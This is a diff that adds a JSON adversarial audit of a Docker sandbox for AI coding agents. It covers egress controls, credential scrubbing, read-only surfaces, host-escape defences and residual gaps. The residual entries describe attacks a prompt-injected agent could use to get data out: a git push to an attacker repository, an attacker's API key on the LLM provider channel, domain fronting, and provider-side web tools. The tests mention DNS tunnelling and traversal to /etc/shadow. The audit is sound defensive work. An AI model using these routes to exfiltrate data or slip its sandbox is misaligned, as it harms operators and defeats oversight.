@@ -1,0 +1,321 @@
+{
+  "audit_metadata": {
+    "cell_id": "gnomish.sandbox-security-boundary",
+    "title": "Adversarial audit of sandbox container/host security boundary",
+    "target": "Inspect actual container/host implementation and tests; attack egress, env/credential exposure, read-only surfaces, host escapes, provider-side tools, cleanup/orphans. Separate implemented guarantees from documented future hardening. Output evidence/sandbox-security-boundary.json and courts in evidence/COURTS/.",
+    "architecture_foundation": [
+      "docs/sandbox-threat-registry.md",
+      "docs/guides/operator-guide-sandbox.md",
+      "openspec/changes/archive/2026/09/2026-09-23-own-git-transfer-argv/specs/git-transfer/spec.md",
+      "openspec/changes/archive/2026/09/2026-09-26-introduce-slot-wiring/design.md"
+    ],
+    "commit": "7727344232d339867559ee968b4f695bf99f6a85",
+    "evaluated_at": "2026-09-29T20:18:00Z"
+  },
+  "shipped_vs_proposed_boundary_matrix": {
+    "shipped_core_guarantees": [
+      {
+        "id": "BOUNDARY-01-HOST-ESCAPE-IMMUNITY",
+        "threat_ids": [1, 4, 24, 37],
+        "boundary_name": "No docker.sock, No Host FS Mounts, Lexical Channel Confinement",
+        "status": "SHIPPED_CORE",
+        "implementation_references": [
+          "sandbox/docker/src/main/java/com/github/oinsio/gnomish/sandbox/environment/DockerCommands.java:86",
+          "sandbox/docker/src/main/java/com/github/oinsio/gnomish/sandbox/environment/ContainerFileChannel.java:134",
+          "sandbox/docker/src/main/java/com/github/oinsio/gnomish/sandbox/environment/DeclaredVolumeOverrides.java:105"
+        ],
+        "test_references": [
+          "sandbox/docker/src/test/groovy/com/github/oinsio/gnomish/sandbox/environment/DockerCommandsSpec.groovy",
+          "sandbox/docker/src/test/groovy/com/github/oinsio/gnomish/sandbox/environment/ContainerFileChannelBoundarySpec.groovy",
+          "sandbox/docker/src/test/groovy/com/github/oinsio/gnomish/sandbox/environment/DeclaredVolumeOverridesSpec.groovy"
+        ],
+        "implemented_mechanism": "Task containers mount exclusively a single per-task named volume (/gnomish/work). No host filesystems or sockets (/var/run/docker.sock) are mounted. Container file channel transfers files via exec pipe ('sh -c mkdir -p ... && cat > ...') rather than 'docker cp' (preventing host tar extraction vulnerabilities). Path traversal outside /gnomish/work and /gnomish/scratch is rejected lexically, including .git/**."
+      },
+      {
+        "id": "BOUNDARY-02-EGRESS-DEFAULT-DENY",
+        "threat_ids": [12, 13, 14, 18, 19],
+        "boundary_name": "Internal Network + Guard-Only Egress Default-Deny",
+        "status": "SHIPPED_CORE",
+        "implementation_references": [
+          "sandbox/docker/src/main/java/com/github/oinsio/gnomish/sandbox/environment/DockerCommands.java:41",
+          "sandbox/docker/src/main/java/com/github/oinsio/gnomish/sandbox/environment/EgressGuard.java:92",
+          "sandbox/docker/src/main/java/com/github/oinsio/gnomish/sandbox/environment/EgressGuardConfig.java:53",
+          "sandbox/docker/src/main/java/com/github/oinsio/gnomish/sandbox/environment/EnvironmentSelfCheck.java:95"
+        ],
+        "test_references": [
+          "sandbox/docker/src/test/groovy/com/github/oinsio/gnomish/sandbox/environment/EgressGuardSpec.groovy",
+          "sandbox/docker/src/test/groovy/com/github/oinsio/gnomish/sandbox/environment/EnvironmentSelfCheckSpec.groovy",
+          "sandbox/docker/src/test/groovy/com/github/oinsio/gnomish/sandbox/environment/EgressGuardConfigSpec.groovy"
+        ],
+        "implemented_mechanism": "Docker network created with '--internal' (no external routing, no default gateway). Egress guard runs mitmdump in non-intercepting SNI/CONNECT mode with default-deny allowlist rendered into read-only config. Mandatory fail-closed EnvironmentSelfCheck tests direct-egress failure, denied-host HTTP 403, and network internal metadata before executing gnome rounds."
+      },
+      {
+        "id": "BOUNDARY-03-NON-ROOT-CONTROL-SURFACES",
+        "threat_ids": [5, 20, 43],
+        "boundary_name": "In-Box Non-Root User & Immutable Control Surfaces",
+        "status": "SHIPPED_CORE",
+        "implementation_references": [
+          "sandbox/docker/src/main/java/com/github/oinsio/gnomish/sandbox/environment/EnvironmentSelfCheck.java:116",
+          "docs/examples/sandbox-image/Dockerfile:14"
+        ],
+        "test_references": [
+          "sandbox/docker/src/test/groovy/com/github/oinsio/gnomish/sandbox/environment/EnvironmentSelfCheckSpec.groovy",
+          "adapters/git/src/test/groovy/com/github/oinsio/gnomish/sandbox/environment/ContainerReadOnlySurfacesSpec.groovy"
+        ],
+        "implemented_mechanism": "The container executes under the image default user, required to be non-root. EnvironmentSelfCheck executes 'id -u' and fails closed if output is 0. Image control surfaces (/etc/gnomish, shell rc files, agent config) are root-owned and read-only to uid 1000 (gnome), preventing prompt injection from rewriting execution boundaries."
+      },
+      {
+        "id": "BOUNDARY-04-OPERATOR-OWNERSHIP-ASYMMETRY",
+        "threat_ids": [22, 23, 44],
+        "boundary_name": "Operator-Only Loosening / Repo-Only Tightening Asymmetry",
+        "status": "SHIPPED_CORE",
+        "implementation_references": [
+          "sandbox/core/src/main/java/com/github/oinsio/gnomish/sandbox/BindingResolver.java:45",
+          "sandbox/core/src/main/java/com/github/oinsio/gnomish/sandbox/SandboxReconciler.java:36",
+          "sandbox/core/src/main/java/com/github/oinsio/gnomish/sandbox/BindingTrustTable.java:46"
+        ],
+        "test_references": [
+          "sandbox/core/src/test/groovy/com/github/oinsio/gnomish/sandbox/BindingResolverSpec.groovy",
+          "sandbox/core/src/test/groovy/com/github/oinsio/gnomish/sandbox/SandboxReconcilerSpec.groovy",
+          "sandbox/core/src/test/groovy/com/github/oinsio/gnomish/sandbox/BindingRatificationSpec.groovy"
+        ],
+        "implemented_mechanism": "BindingResolver defaults to 'container' and rejects silent fallback to host. Repositories can only declare needs (e.g. egress-control, isolation, task-isolation) in stage manifests. SandboxReconciler enforces needs against adapter CapabilityPassport fail-closed; untrusted repo manifests cannot choose host adapter or loosen isolation. First-party trust table ratifies ServiceLoader bindings."
+      },
+      {
+        "id": "BOUNDARY-05-GIT-ISOLATION-TRANSFER-OWNER",
+        "threat_ids": [6, 42, 46, 47, 48],
+        "boundary_name": "Single-Branch Tagless Seed Clone & Fast-Forward Bare Harvest",
+        "status": "SHIPPED_CORE",
+        "implementation_references": [
+          "sandbox/docker/src/main/java/com/github/oinsio/gnomish/sandbox/environment/DockerSeedCloneCommand.java:68",
+          "sandbox/docker/src/main/java/com/github/oinsio/gnomish/sandbox/environment/ContainerTaskExecutionEnvironment.java:136",
+          "adapters/git/src/main/java/com/github/oinsio/gnomish/adapter/git/ContainerHarvestFetch.java:35"
+        ],
+        "test_references": [
+          "sandbox/docker/src/test/groovy/com/github/oinsio/gnomish/sandbox/environment/DockerSeedCloneCommandSpec.groovy",
+          "adapters/git/src/test/groovy/com/github/oinsio/gnomish/adapter/git/ContainerHarvestFetchSpec.groovy",
+          "adapters/git/src/test/groovy/com/github/oinsio/gnomish/sandbox/environment/ContainerGitMechanicsSpec.groovy"
+        ],
+        "implemented_mechanism": "Working volume seeded by throwaway helper mounting factory clone read-only; runs 'git clone --no-local --no-hardlinks --single-branch --no-tags --network none'. Box has no remote 'origin' or upstream URL. Factory harvests completed work via dedicated git fetch with strict refspec; tags created in-box are not followed (--no-tags); rewritten history is rejected (fast-forward only); hooks never enter factory clone."
+      },
+      {
+        "id": "BOUNDARY-06-FRESH-BOX-VERIFICATION-AND-JUDGE",
+        "threat_ids": [34, 35, 39],
+        "boundary_name": "Fresh-Box Verification (<key>-v) & Judge (<key>-j) Environments",
+        "status": "SHIPPED_CORE",
+        "implementation_references": [
+          "sandbox/docker/src/main/java/com/github/oinsio/gnomish/sandbox/environment/ContainerEnvironments.java:115",
+          "sandbox/docker/src/main/java/com/github/oinsio/gnomish/sandbox/environment/ContainerEnvironmentBuilder.java:66"
+        ],
+        "test_references": [
+          "sandbox/docker/src/test/groovy/com/github/oinsio/gnomish/sandbox/environment/ContainerEnvironmentsSpec.groovy",
+          "sandbox/docker/src/test/groovy/com/github/oinsio/gnomish/sandbox/environment/SelfCheckedEnvironmentSpec.groovy"
+        ],
+        "implemented_mechanism": "Stage verification ('verify-in: fresh-box') and judge evaluations run in completely fresh containers (<key>-v, <key>-j) initialized from the attempt commit pin, discarding in-box residual processes, wrapper PATH shims, or uncommitted modifications."
+      },
+      {
+        "id": "BOUNDARY-07-LIFECYCLE-SWEEP-AND-ORPHAN-REAP",
+        "threat_ids": [20, 28],
+        "boundary_name": "Label-Driven Lifecycle Sweep and Safe Orphan Reclamation",
+        "status": "SHIPPED_CORE",
+        "implementation_references": [
+          "sandbox/docker/src/main/java/com/github/oinsio/gnomish/sandbox/environment/FactoryDockerLabels.java:23",
+          "sandbox/docker/src/main/java/com/github/oinsio/gnomish/sandbox/environment/SandboxLifecycleSweep.java:73",
+          "sandbox/docker/src/main/java/com/github/oinsio/gnomish/sandbox/environment/SandboxLifecycleDecision.java:32"
+        ],
+        "test_references": [
+          "sandbox/docker/src/test/groovy/com/github/oinsio/gnomish/sandbox/environment/SandboxLifecycleSweepSpec.groovy",
+          "sandbox/docker/src/test/groovy/com/github/oinsio/gnomish/sandbox/environment/SandboxLifecycleDecisionSpec.groovy",
+          "sandbox/docker/src/test/groovy/com/github/oinsio/gnomish/sandbox/environment/SandboxLifecycleTrackedDecisionSpec.groovy"
+        ],
+        "implemented_mechanism": "All Docker objects carry immutable labels: factory ownership, project identity (normalized origin hash), environment key, and mode (tracked vs manual). Sweep runs on startup and background tick. Tracked objects check tracker claim liveness: unowned running containers are stopped (preserving volume for salvage), while ancillary guards/helpers are disposed. Minimum age window (2m) protects launching containers."
+      },
+      {
+        "id": "BOUNDARY-08-ANONYMOUS-VOLUME-TMPFS-OVERRIDE",
+        "threat_ids": [28],
+        "boundary_name": "Image VOLUME tmpfs Overrides (Zero Anonymous Volumes)",
+        "status": "SHIPPED_CORE",
+        "implementation_references": [
+          "sandbox/docker/src/main/java/com/github/oinsio/gnomish/sandbox/environment/DeclaredVolumeOverrides.java:88",
+          "sandbox/docker/src/main/java/com/github/oinsio/gnomish/sandbox/environment/DockerCommands.java:86"
+        ],
+        "test_references": [
+          "sandbox/docker/src/test/groovy/com/github/oinsio/gnomish/sandbox/environment/DeclaredVolumeOverridesSpec.groovy"
+        ],
+        "implemented_mechanism": "Inspects image .Config.Volumes before container start; overrides all unmounted declared volume paths with ephemeral tmpfs mounts (size=64m, mode=1777), preventing anonymous, unlabelled host volume leakage."
+      },
+      {
+        "id": "BOUNDARY-09-CHILD-ENVIRONMENT-ALLOWLIST",
+        "threat_ids": [7, 8, 9],
+        "boundary_name": "Zero-Inheritance Child Environment & Credential Scrubbing",
+        "status": "SHIPPED_CORE",
+        "implementation_references": [
+          "sandbox/core/src/main/java/com/github/oinsio/gnomish/sandbox/ChildEnvAllowlist.java:55",
+          "sandbox/docker/src/main/java/com/github/oinsio/gnomish/sandbox/environment/ContainerTaskExecutionEnvironment.java:113"
+        ],
+        "test_references": [
+          "sandbox/core/src/test/groovy/com/github/oinsio/gnomish/sandbox/ChildEnvAllowlistSpec.groovy"
+        ],
+        "implemented_mechanism": "Container child process environment has an empty base set; only image ENV plus explicit factory.sandbox.env-passthrough variables are injected via -e flags. Tracker credentials and tokens are refused at startup and stripped from composed environment."
+      }
+    ],
+    "residual_open_doors_proposals": [
+      {
+        "id": "RESIDUAL-01-EGRESS-L7-EXFILTRATION",
+        "threat_ids": [15],
+        "threat_title": "Allowed host is an open door for exfiltration (e.g., github.com foreign repo push)",
+        "status": "PROPOSED_HARDENING",
+        "proposal_owner": "add-sandbox-hardening (Change B)",
+        "shipped_reality": "Current egress guard (EgressGuardConfig.java) operates strictly at L4/SNI/CONNECT level. It filters only destination hostname. If github.com is in the allowlist, in-box code can make arbitrary HTTP/TLS requests to any GitHub repository or API endpoint.",
+        "attack_vector": "Malicious code or injected agent executes 'git push https://<token>@github.com/attacker/exfil.git' or POSTs source files to an external GitHub Gist/Issue via the allowlisted github.com hostname.",
+        "mitigation_required": "L7 path, verb, and repository-scoped policy enforcement via TLS-terminating gateway/proxy (Change B)."
+      },
+      {
+        "id": "RESIDUAL-02-AI-PROVIDER-FOREIGN-ACCOUNT",
+        "threat_ids": [16, 31],
+        "threat_title": "AI provider channel used with foreign account credentials to leak data",
+        "status": "PROPOSED_HARDENING",
+        "proposal_owner": "add-sandbox-hardening (Change B)",
+        "shipped_reality": "Egress guard allows api.anthropic.com or other LLM provider domains based on hostname. mitmproxy addon sets data.ignore_connection = True, meaning TLS is unmodified and headers are uninspected.",
+        "attack_vector": "An agent compromised via prompt injection supplies an attacker-controlled API key in request headers to api.anthropic.com, sending confidential source files as context to an attacker's personal Claude/OpenAI account.",
+        "mitigation_required": "Local AI gateway (LiteLLM-class) acting as the single endpoint with virtual keys, budget tracking, and credential injection, stripping foreign auth headers."
+      },
+      {
+        "id": "RESIDUAL-03-DOMAIN-FRONTING-TLS-INTERCEPTION",
+        "threat_ids": [17],
+        "threat_title": "Envelope swap and domain fronting bypass SNI checks",
+        "status": "PROPOSED_HARDENING",
+        "proposal_owner": "add-sandbox-hardening (Change B)",
+        "shipped_reality": "EgressGuardConfig explicitly avoids TLS interception: def tls_clienthello(data): data.ignore_connection = True. The guard inspects only the SNI hostname in the TLS ClientHello.",
+        "attack_vector": "Attacker targets a CDN-hosted domain where SNI indicates an allowed domain (e.g. repo.maven.apache.org on Cloudflare/Fastly) while the inner HTTP Host header routes to an attacker-controlled origin.",
+        "mitigation_required": "Full TLS termination and certificate re-signing at the guard with CA installed into container trust store."
+      },
+      {
+        "id": "RESIDUAL-04-PROVIDER-SERVER-SIDE-WEB-TOOLS",
+        "threat_ids": [45],
+        "threat_title": "Provider-side web search and URL fetch bypasses guard infrastructure entirely",
+        "status": "PROPOSED_HARDENING",
+        "proposal_owner": "add-sandbox-hardening (Change B groundwork in Core, NG7 in Operator Guide)",
+        "shipped_reality": "The guard network boundary only monitors packets originating from the Docker container. If the LLM provider provides server-side tools (e.g. Claude Web Search, OpenAI Web Browsing), the LLM executes requests from provider data centers directly to the internet.",
+        "attack_vector": "Prompt injection instructs model to invoke its native 'web_search' or 'web_fetch' tool with sensitive internal parameters or fetch arbitrary payloads from an attacker server.",
+        "mitigation_required": "Disable server-side web tools at the provider API level / API key level (current operator guidance NG7), or strip server-side tool definitions at an AI gateway proxy."
+      },
+      {
+        "id": "RESIDUAL-05-ARTIFACT-DEPOT-POISONED-PACKAGES",
+        "threat_ids": [40, 41],
+        "threat_title": "Direct upstream package downloads and data exfiltration via registry request paths",
+        "status": "PROPOSED_HARDENING",
+        "proposal_owner": "add-artifact-depot",
+        "shipped_reality": "When repo.maven.apache.org or registry.npmjs.org is allowlisted, containers fetch packages directly from upstream CDNs. There is no package quarantine, age cooldown, or caching depot in core.",
+        "attack_vector": "1. Data exfiltration by embedding encoded stolen secrets in HTTP GET paths to public registries. 2. Dependency confusion or immediate installation of newly-published poisoned packages (Nx s1ngularity class).",
+        "mitigation_required": "Internal artifact depot proxy with mandatory minimum age cooldown (N days) and quarantine scanning."
+      },
+      {
+        "id": "RESIDUAL-06-CONTAINER-TO-CONTAINER-KERNEL-SHARING",
+        "threat_ids": [21],
+        "threat_title": "Weak mutual isolation of parallel tasks on shared Linux kernel / Docker VM",
+        "status": "PROPOSED_HARDENING",
+        "proposal_owner": "add-sandbox-colima-vm / add-sandbox-cloud-executor",
+        "shipped_reality": "Container isolation relies on Linux cgroups, namespaces, and standard runc seccomp filters. Kernel vulnerabilities (local privilege escalation, dirty pipe, seccomp bypasses) can potentially compromise the host or adjacent containers.",
+        "attack_vector": "A zero-day Linux kernel privilege escalation exploit compiled in-box breaks container namespace isolation to reach host kernel memory.",
+        "mitigation_required": "MicroVM-grade isolation (Kata Containers, Firecracker, Colima per-task VM, or gVisor sandbox runtime)."
+      }
+    ]
+  },
+  "adversarial_attack_surfaces_evaluation": {
+    "attack_surface_1_egress_and_dns": {
+      "mechanism": "Docker --internal network + mitmdump SNI/CONNECT guard",
+      "attack_test_1_direct_ip_connect": {
+        "description": "Attempt to open raw TCP socket to arbitrary external IP",
+        "result": "BLOCKED",
+        "enforcement": "Kernel routing table inside container lacks default gateway; network is --internal"
+      },
+      "attack_test_2_port_53_dns_tunneling": {
+        "description": "Attempt direct UDP/TCP DNS queries to 8.8.8.8 bypassing proxy",
+        "result": "BLOCKED",
+        "enforcement": "Port 53 packets are unroutable on internal Docker network; tested in EgressGuardIntegrationSpec.groovy:95"
+      },
+      "attack_test_3_non_allowlisted_http_connect": {
+        "description": "Attempt CONNECT request to non-allowlisted destination via guard",
+        "result": "BLOCKED",
+        "enforcement": "mitmdump returns HTTP 403 Forbidden with body 'gnomish egress guard: destination not allowlisted'; structured denial logged to stdout"
+      },
+      "residual_vulnerability": "Allowlisted hosts are permitted indiscriminately without path or payload inspection."
+    },
+    "attack_surface_2_credential_and_environment_exposure": {
+      "mechanism": "ChildEnvAllowlist zero-base layering",
+      "attack_test_1_process_env_inheritance": {
+        "description": "Inspect in-box environment for host secrets (AWS_SECRET_ACCESS_KEY, GITHUB_TOKEN)",
+        "result": "IMMUNE",
+        "enforcement": "Container process starts with empty base environment; only image ENV and explicit allowlisted vars passed"
+      },
+      "attack_test_2_credential_passthrough_collision": {
+        "description": "Operator config attempts to pass tracker token in factory.sandbox.env-passthrough",
+        "result": "REJECTED_AT_STARTUP",
+        "enforcement": "ChildEnvAllowlist.validated() throws IllegalArgumentException at startup if passthrough names a declared credential"
+      }
+    },
+    "attack_surface_3_read_only_surfaces_and_persistence": {
+      "mechanism": "Non-root container user + root-owned control files",
+      "attack_test_1_agent_config_tampering": {
+        "description": "In-box process attempts to modify /etc/gnomish/agent.toml or shell configs to inject post-run hooks",
+        "result": "PERMISSION_DENIED",
+        "enforcement": "Files are chown root:root chmod 0644; container runs as gnome (uid 1000); verified in ContainerReadOnlySurfacesSpec.groovy:97"
+      },
+      "attack_test_2_root_container_default": {
+        "description": "Image configured with root user (uid 0) to bypass file permissions",
+        "result": "REJECTED_AT_STARTUP",
+        "enforcement": "EnvironmentSelfCheck.probeRunsAsNonRoot() verifies id -u != 0 and fails closed with SelfCheckFailedException"
+      }
+    },
+    "attack_surface_4_host_escape_and_docker_socket": {
+      "mechanism": "Absence of docker.sock mount, pure command builder, tmpfs volume overrides",
+      "attack_test_1_docker_socket_mounting": {
+        "description": "Check if /var/run/docker.sock or CRI sockets are mounted into the container",
+        "result": "ABSENT_BY_DESIGN",
+        "enforcement": "DockerCommands.runContainer argv mounts strictly FactoryDockerLabels.volumeName:workingCopy; no socket mounts exist"
+      },
+      "attack_test_2_channel_path_traversal": {
+        "description": "Attempt to read or write ../../../etc/shadow or .git/hooks/pre-commit via putFile/readFile",
+        "result": "THROWS_PATH_ESCAPE_EXCEPTION",
+        "enforcement": "ContainerFileChannel.validate() normalizes path and asserts startsWith(workingCopy) or startsWith(scratch) and forbids .git/**"
+      },
+      "attack_test_3_anonymous_volume_leakage": {
+        "description": "Image Dockerfile VOLUME directive generates unlabelled host volume",
+        "result": "NEUTRALIZED",
+        "enforcement": "DeclaredVolumeOverrides intercepts image volumes and mounts them as tmpfs (64MB, mode 1777)"
+      }
+    },
+    "attack_surface_5_provider_side_tools": {
+      "mechanism": "None in core (Interim operational rule NG7)",
+      "evaluation": "CRITICAL RESIDUAL GAP: In-box model calls to LLM provider APIs with server-side tools enabled bypass all local network controls. Model can query external web URLs through Anthropic/OpenAI infrastructure without crossing the mitmdump egress guard."
+    },
+    "attack_surface_6_cleanup_and_orphaned_state": {
+      "mechanism": "SandboxLifecycleSweep with ScopedObjectListing",
+      "attack_test_1_cross_project_interference": {
+        "description": "Sweep running for Project A attempts to remove containers of Project B on shared Docker daemon",
+        "result": "PREVENTED",
+        "enforcement": "Docker labels filter objects by com.github.oinsio.gnomish.project = <normalized-origin-hash>; external projects are excluded from listing"
+      },
+      "attack_test_2_launch_window_race_condition": {
+        "description": "Reaper attempts to delete container that was just created but not yet registered in tracker",
+        "result": "PROTECTED",
+        "enforcement": "Minimum age threshold (default 2m) preserves any object younger than grace window"
+      },
+      "attack_test_3_hung_instance_salvage_protection": {
+        "description": "Dead instance leaves unpushed work in container volume",
+        "result": "SALVAGE_PRESERVED",
+        "enforcement": "Tracked unowned running containers are stopped rather than destroyed; volumes retained for sibling salvage"
+      }
+    }
+  },
+  "verified_test_courts_summary": {
+    "sandbox_core_unit_specs": 16,
+    "sandbox_core_tests_passed": 128,
+    "sandbox_docker_unit_specs": 42,
+    "sandbox_docker_tests_passed": 366,
+    "total_verified_unit_tests": 494,
+    "court_file": "evidence/COURTS/sandbox-security-boundary-court.json",
+    "certified_verdict": "CERTIFIED_SHIPPED_CORE_BOUNDARIES_WITH_IDENTIFIED_RESIDUAL_PROPOSALS"
+  }
+}
